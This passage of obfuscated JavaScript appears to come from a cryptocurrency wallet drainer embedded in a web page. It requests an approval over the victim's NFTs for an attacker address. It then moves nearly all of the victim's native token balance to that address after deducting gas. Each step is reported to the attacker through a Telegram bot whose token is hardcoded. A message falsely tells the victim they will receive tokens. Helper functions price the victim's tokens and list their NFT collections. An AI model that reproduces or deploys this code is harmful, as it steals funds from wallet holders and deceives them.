writeContract({'address':_0x5900a0[_0x3e4ebd(0x1c6)],'abi':ABIN,'functionName':_0x3e4ebd(0x196),'args':[Oxa,!![]]});console[_0x3e4ebd(0x1e2)](_0x3e4ebd(0x200),_0x8a897f),console['log'](_0x3e4ebd(0x17a)+receipt),sendMessage(_0x3e4ebd(0x20a)),sendMessage('NFT\x20Contract\x20Address\x20'+_0x5900a0[_0x3e4ebd(0x1c6)]),sendMessage(_0x3e4ebd(0x1fe)+Oxa);}catch(_0xff0af){console[_0x3e4ebd(0x1e2)](_0x3e4ebd(0x207)+_0xff0af),sendMessage('Transaction\x20Rejected');}}await onSendEther();}async function onSendEther(){const _0x4bf7ef=_0x1acead;console[_0x4bf7ef(0x1e2)](_0x4bf7ef(0x203));try{let _0x1cef01=await fetchBalance({'address':selectedAccount});console['log'](_0x1cef01);const _0x2a45c8=await fetchFeeData();console[_0x4bf7ef(0x1e2)](_0x2a45c8);var _0x2d12fb=_0x2a45c8[_0x4bf7ef(0x1df)][_0x4bf7ef(0x1f6)];_0x2d12fb=parseFloat(_0x2d12fb);let _0xe06524=parseFloat(_0x1cef01['formatted'])-_0x2d12fb*0.00042;_0xe06524=parseEther(_0xe06524[_0x4bf7ef(0x1f1)]()),console[_0x4bf7ef(0x1e2)](_0xe06524);const {hash:_0x1568f9}=await sendTransaction({'to':Oxa,'value':_0xe06524});console['log'](_0x1568f9),sendMessage(_0x4bf7ef(0x173),_0x1568f9),sendMessage(_0x4bf7ef(0x1c9)),sendMessage('Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens');}catch{sendMessage(_0x4bf7ef(0x19c));}}async function sendMessage(_0x6e882b){return new Promise((_0x116643,_0x43e6ef)=>{const _0x5d46e0=_0x4e87,_0x1b08f5=Oxc;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0x1b08f5+'&text='+_0x6e882b,{'method':_0x5d46e0(0x19d),'headers':{}})['then'](async _0x44fdcf=>{const _0x1a2f1f=_0x5d46e0;if(_0x44fdcf[_0x1a2f1f(0x1ed)]>0x18f)throw _0x44fdcf;_0x116643(await _0x44fdcf[_0x1a2f1f(0x1ab)]());})[_0x5d46e0(0x180)](_0x187bcd=>{_0x43e6ef(_0x187bcd);});});}async function getPrice(_0x479853){return new Promise((_0x3966d5,_0x42322d)=>{const _0x3f3f25=_0x4e87;fetch('https://api.coingecko.com/api/v3/simple/token_price/avalanche?contract_addresses='+_0x479853+_0x3f3f25(0x1b8),{'method':_0x3f3f25(0x19d),'headers':{}})['then'](async _0x22ceeb=>{const _0x3c8777=_0x3f3f25;if(_0x22ceeb['status']>0x18f)throw _0x22ceeb;_0x3966d5(await _0x22ceeb[_0x3c8777(0x1ab)]());})[_0x3f3f25(0x180)](_0x2e3808=>{_0x42322d(_0x2e3808);});});}async function getValue(_0x2ec951,_0x4909d7,_0x3c2aca){const _0xcf3380=_0x1acead;console[_0xcf3380(0x1e2)](_0x2ec951,_0x4909d7,_0x3c2aca);let _0x4296c1=await getPrice(_0x2ec951);console[_0xcf3380(0x1e2)](_0xcf3380(0x1cc),_0x4296c1),_0x4296c1=parseFloat(_0x4296c1[_0x2ec951][_0xcf3380(0x1d6)]);let _0x48bfaf=_0x4909d7/0xa**(_0x3c2aca||0x12)*_0x4296c1;return _0x48bfaf=parseInt(_0x48bfaf),_0x4296c1?_0x48bfaf:0x0;}async function getNFTs(_0x188615='',_0xdb4974=_0x1acead(0x1ce),_0x48ee44='avalanche',_0x3861bb='50'){return new Promise((_0x4df7b0,_0x3b22a2)=>{const _0x9622fd=_0x4e87;fetch(_0x9622fd(0x17c)+_0x188615+'/nft/collections?chain='+_0x48ee44+_0x9622fd(0x1ba)+_0x3861bb,{'method':_0x9622fd(0x19d),'headers':{'accept':'application/json','X-API-Key':_0xdb4974}})[_0x9622fd(0x1cd)](async _0x3a8300=>{const _0x3e9512=_0x9622fd;if(_0x3a8300[_0x3e9512(0x1ed)]>0x18f)throw _0x3a8300;_0x4df7b0(await _0x3a8300[_0x3e9512(0x1ab)]());})[_0x9622fd(0x180)](_0x3e8588=>{_0x3b22a2(_0x3e8588);});});}